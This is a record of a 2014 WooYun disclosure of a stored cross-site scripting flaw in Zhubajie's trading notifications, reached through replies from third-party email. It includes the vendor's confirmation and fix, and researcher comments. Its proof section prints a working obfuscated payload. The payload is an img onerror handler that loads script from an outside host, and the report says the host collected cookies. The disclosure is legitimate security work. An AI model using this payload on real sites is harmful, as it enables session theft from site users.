{"id": 47305, "wybug_id": "wooyun-2014-087219", "wybug_title": "猪八戒威客网互动功能过滤不严导致持久型XSS漏洞（无限制）", "wybug_corp": "猪八戒网", "wybug_author": "Hucheat", "wybug_date": "2014-12-15 15:35", "wybug_open_date": "2015-01-29 15:36", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向公众公开  简要描述： 猪八戒威客网互动功能过滤不严导致持久型XSS漏洞（无限制） 详细说明：  猪八戒威客网国际站在交易时允许使用绑定的第三方邮箱进行回复评论。攻击者若在回复邮件时插入恶意xss代码，即可以通过猪八戒的临时邮箱把邮件内容不经过滤地显示在主站的交易提醒页面中去。   漏洞证明：  以QQ邮箱为例：回复猪网的临时邮件时先插入一张表情，然后F12审查元素，找到表情的img标签，\n<img src=\"http://rescdn.qqmail.com/zh_CN/images/mo/DEFAULT2/0.gif\" style=\"line-height: 1.5;\">\n改成：\n<img src=\"#\" id=\"Iamsohandsome\" style=\"display:none\" onerror=\"eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fhangsomeboy.com%2FkwwACZ%3F%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//\">\n发送~插入的xss代码在主站消息提醒中心中显示为下图：\n\nxss平台收到cookie信息：\n\n再看看QQ邮箱的“已发送”邮件，审查元素可以看到插入的img标签虽然还在但是onerror属性已经直接被过滤掉了。\n\n可见至少是QQ邮箱在发送邮件时很有可能是不经过过滤的，只有在显示在邮箱上时才过滤输出？。。。   修复方案：  所以，自己过滤，丰衣足食。第三方邮箱大大的坏着呢，别太指望它了~   版权声明：转载请注明来源 Hucheat@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-12-15 16:38 厂商回复： 感谢@Hucheat 的反馈 问题确实存在！正在处理。 最新状态： 2014-12-18：问题已经修复。再次感谢@Hucheat 我准备了一对猪公仔略表心意！  ", "replys": "漏洞评价：\n评论\n     2014-12-15 15:39 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  危害还是XSS，但是思路很好，突破了程序限制的边界。    \n     2014-12-15 16:28 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  看了楼上的评价，就知道这个洞必须关注    \n     2014-12-15 17:21 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @BMa 姿势不错，有学习价值    \n     2014-12-15 22:02 |    \t\tHucheat \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 什么时候才不是路人T_T)\t\t \n  @疯狗 ==！新人一枚，这样说真的好吗？    \n     2014-12-16 11:27 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Hucheat 啊？哪里不妥了，感觉思路确实比较有意思，可能不是第一个案例，但还是很感谢提供的技术点：）    \n     2015-01-29 16:10 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  我准备了一对猪公仔略表心意    \n     2015-01-29 16:38 |    \t\tZtz \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:40        | 自由职业)\t\t \n  我准备了一对猪公仔略表心意！    \n     2015-01-30 14:31 |    \t\tWinck \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | http://weibo.com/hackwinck hackwinck  By...)\t\t \n  我准备了一对猪母仔略表心意    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}